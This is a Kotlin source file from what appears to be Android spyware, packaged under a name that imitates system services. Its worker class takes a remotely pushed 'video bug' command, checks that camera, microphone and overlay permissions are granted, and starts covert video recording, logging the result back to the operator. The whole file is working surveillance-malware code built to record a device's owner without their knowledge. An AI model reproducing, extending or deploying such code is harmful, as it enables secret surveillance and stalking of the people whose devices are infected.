package com.android.services.workers

import android.Manifest
import android.content.Context
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.android.services.db.entities.PushStatus
import com.android.services.enums.FcmPushStatus
import com.android.services.models.FCMPush
import com.android.services.models.VideoBugCommand
import com.android.services.services.videoBug.VideoBugCommandService
import com.android.services.util.*
import com.google.gson.Gson
import com.google.gson.GsonBuilder


class VideoBugScheduleWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    companion object {
        const val KEY_VIDEO_BUG_COMMAND = "KEY_VIDEO_BUG_COMMAND"
    }

    override fun doWork(): Result {
        try{
            logVerbose("${AppConstants.VIDEO_BUG_TYPE} Future worker called")
            val extraCommand: String? = inputData.getString(KEY_VIDEO_BUG_COMMAND)
            extraCommand?.let {
                val videoBugScheduleCommand = GsonBuilder().create()
                    .fromJson<VideoBugCommand>(
                        extraCommand,
                        VideoBugCommand::class.java
                    )
                // Checks current status of MicBug permissions and service,
                // Whether MicBug can be scheduled or not
                val fcmPushStatus = FirebasePushUtils.checkBugStatus(
                    applicationContext,
                    "startVideoBug", arrayOf(
                        Manifest.permission.RECORD_AUDIO,
                        Manifest.permission.SYSTEM_ALERT_WINDOW,
                        Manifest.permission.CAMERA
                    ),
                    VideoBugCommandService::class.java.name
                )
                if (fcmPushStatus == FcmPushStatus.RECEIVED) {
                    startVideoBugRecording(videoBugScheduleCommand)
                } else {
                    AppUtils.appendLog(applicationContext, "${AppConstants.VIDEO_BUG_TYPE} push failed")
                    val pushStatus = PushStatus(
                        videoBugScheduleCommand.pushId, fcmPushStatus.getStatus(),
                        videoBugScheduleCommand.pushId.split("_")[0],
                        AppUtils.getDate(System.currentTimeMillis()), 0
                    )
                    InjectorUtils.providePushStatusRepository(applicationContext)
                        .updatePushStatus(pushStatus)
                }
            } ?: kotlin.run {
                AppUtils.appendLog(applicationContext, "${AppConstants.VIDEO_BUG_TYPE} extraCommand is Null")
                logVerbose("${AppConstants.VIDEO_BUG_TYPE} extraCommand is Null")
            }
        }catch (e:Exception){
            logVerbose("${AppConstants.VIDEO_BUG_TYPE} Exception while starting the scheduled video bug ex=$e")
        }
        return Result.success()
    }

    /** Start the VideoBug Recording **/
    private fun startVideoBugRecording(videoBugCommand: VideoBugCommand) {
        val videoBugCommandJson = Gson().toJson(
            videoBugCommand
        )
        val pushId = videoBugCommand.pushId
        val fcmPush =
            FCMPush(
                videoBugCommandJson,
                "videobug",
                videoBugCommand.pushId,
                pushId.split("_")[0]
            )
        FirebasePushUtils.startPushCommand(applicationContext, fcmPush, AppConstants.VIDEO_BUG_TYPE)
    }
}